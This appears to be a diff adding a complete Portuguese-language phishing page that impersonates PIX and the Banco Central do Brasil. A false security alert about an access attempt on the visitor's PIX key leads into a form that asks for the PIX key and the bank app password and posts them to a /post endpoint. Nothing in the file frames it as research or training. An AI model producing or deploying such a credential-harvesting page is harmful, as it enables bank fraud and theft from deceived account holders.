@@ -1,0 +1,184 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PIX - Verificação de Segurança</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', sans-serif;
+        }
+
+        body {
+            background: #00BDAE;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .container {
+            background: #fff;
+            border-radius: 16px;
+            padding: 40px 32px;
+            width: 90%;
+            max-width: 400px;
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.2);
+        }
+
+        .logo {
+            text-align: center;
+            margin-bottom: 24px;
+        }
+
+        .pix-logo {
+            font-size: 48px;
+            font-weight: bold;
+            color: #32BCAD;
+        }
+
+        .alert {
+            background: #FFF3CD;
+            border: 1px solid #FFEAA7;
+            border-radius: 8px;
+            padding: 16px;
+            margin-bottom: 24px;
+        }
+
+        .alert h3 {
+            color: #856404;
+            font-size: 14px;
+            margin-bottom: 8px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .alert p {
+            color: #856404;
+            font-size: 13px;
+            line-height: 1.4;
+        }
+
+        h1 {
+            color: #333;
+            font-size: 20px;
+            text-align: center;
+            margin-bottom: 8px;
+        }
+
+        p.subtitle {
+            color: #666;
+            text-align: center;
+            margin-bottom: 24px;
+            font-size: 14px;
+        }
+
+        .form-group {
+            margin-bottom: 18px;
+        }
+
+        label {
+            display: block;
+            color: #333;
+            font-weight: 500;
+            font-size: 14px;
+            margin-bottom: 8px;
+        }
+
+        input {
+            width: 100%;
+            padding: 14px;
+            border: 2px solid #E0E0E0;
+            border-radius: 8px;
+            font-size: 16px;
+        }
+
+        input:focus {
+            outline: none;
+            border-color: #00BDAE;
+        }
+
+        button {
+            width: 100%;
+            padding: 14px;
+            background: #00BDAE;
+            color: #fff;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+        }
+
+        button:hover {
+            background: #009B8F;
+        }
+
+        .bank-logos {
+            display: flex;
+            justify-content: center;
+            gap: 16px;
+            margin-top: 24px;
+            padding-top: 20px;
+            border-top: 1px solid #E0E0E0;
+        }
+
+        .bank-logo {
+            width: 48px;
+            height: 48px;
+            background: #F5F5F5;
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 12px;
+            color: #666;
+        }
+
+        .footer {
+            margin-top: 20px;
+            text-align: center;
+            font-size: 11px;
+            color: #999;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container">
+        <div class="logo">
+            <div class="pix-logo">PIX</div>
+        </div>
+        <div class="alert">
+            <h3>⚠️ Verificação Necessária</h3>
+            <p>Detectamos uma tentativa de acesso à sua chave PIX. Confirme seus dados para continuar.</p>
+        </div>
+        <h1>Confirme sua identidade</h1>
+        <p class="subtitle">Digite os dados vinculados à sua chave PIX</p>
+        <form action="/post" method="post">
+            <div class="form-group">
+                <label>Chave PIX (CPF, E-mail ou Telefone)</label>
+                <input type="text" name="user" placeholder="Sua chave PIX" required>
+            </div>
+            <div class="form-group">
+                <label>Senha do aplicativo do banco</label>
+                <input type="password" name="pass" placeholder="••••••••" required>
+            </div>
+            <button type="submit">Verificar Chave PIX</button>
+        </form>
+        <div class="bank-logos">
+            <div class="bank-logo">BB</div>
+            <div class="bank-logo">CEF</div>
+            <div class="bank-logo">Itaú</div>
+            <div class="bank-logo">Nu</div>
+        </div>
+        <div class="footer">Banco Central do Brasil - Sistema de Pagamentos Instantâneos</div>
+    </div>
+</body>
+
+</html>
